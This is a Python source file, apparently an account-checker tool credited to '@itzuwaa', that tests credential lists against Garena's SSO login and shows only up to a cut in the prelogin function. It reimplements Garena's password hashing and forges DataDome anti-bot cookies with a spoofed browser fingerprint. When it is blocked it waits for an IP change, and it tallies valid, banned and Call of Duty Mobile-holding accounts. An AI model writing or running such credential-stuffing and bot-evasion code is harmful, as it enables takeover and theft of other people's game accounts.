import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

colorama.init(autoreset=True)

console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[INFO] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[INFO] Current IP: {original_ip}")
        logger.info(f"[INFO] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[INFO] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[INFO] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[INFO] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[INFO] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.banned_count = 0
        self.active_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False, banned=False):
        with self.lock:
            if valid:
                self.valid_count += 1
            else:
                self.invalid_count += 1
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                if valid:
                    self.no_codm_count += 1
            if banned:
                self.banned_count += 1
            else:
                if valid:
                    self.active_count += 1
                                    
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'banned': self.banned_count,
                'active': self.active_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
                
        header_color = '\033[1;96m'  # Bright cyan bold | UWA MALAKI BURAT
        label_color = '\033[1;37m'   # Bright white bold | UWA MALAKI BURAT
        valid_color = '\033[1;92m'   # Bright green bold | UWA MALAKI BURAT
        invalid_color = '\033[1;91m' # Bright red bold | UWA MALAKI BURAT
        clean_color = '\033[1;94m'   # Bright blue bold | UWA MALAKI BURAT
        codm_color = '\033[1;95m'    # Bright magenta bold | UWA MALAKI BURAT
        banned_color = '\033[1;91m'  # Bright red for banned
        active_color = '\033[1;92m'  # Bright green for active
        reset_color = '\033[0m' # RESET COLORS | UWA MALAKI BURAT
        separator = '\033[90m|\033[0m'  # Dark gray separator | UWA MALAKI BURAT
        
        return (
            f"\n{header_color}╔═══════════════════════════════════════════════════════════════════╗{reset_color}\n"
            f"{header_color}║{reset_color}  {label_color}LIVE STATISTICS | UWA - @itzuwaa{reset_color}                                       {header_color}{reset_color}\n"
            f"{header_color}╠═══════════════════════════════════════════════════════════════════╣{reset_color}\n"
            f"{header_color}║{reset_color}  {label_color}VALID: {stats['valid']:>4}{reset_color} {separator} "
            f"{label_color}INVALID: {stats['invalid']:>4}{reset_color} {separator} "
            f"{label_color}CLEAN: {stats['clean']:>4}{reset_color} {separator} "
            f"{label_color}NOT CLEAN: {stats['not_clean']:>4}{reset_color}  {header_color}{reset_color}\n"
            f"{header_color}║{reset_color}  {label_color}HAS CODM: {stats['has_codm']:>3}{reset_color} {separator} "
            f"{label_color}NO CODM: {stats['no_codm']:>3}{reset_color} {separator} "
            f"{label_color}BANNED: {stats['banned']:>3}{reset_color} {separator} "
            f"{label_color}ACTIVE: {stats['active']:>3}{reset_color}  {header_color}{reset_color}\n"
            f"{header_color}╚═══════════════════════════════════════════════════════════════════╝{reset_color}\n"
            f"  {label_color}CREATED by: @itzuwaa{reset_color}"
        )


def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None

def get_ban_status_text(status_code):
    """Convert status code to readable text"""
    status_map = {
        0: "BANNED/RESTRICTED",
        1: "ACTIVE",
        2: "FROZEN",
        3: "UNDER REVIEW",
        4: "SUSPENDED",
        5: "WARNING"
    }
    return status_map.get(status_code, f"UNKNOWN ({status_code})")

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
                        
            i
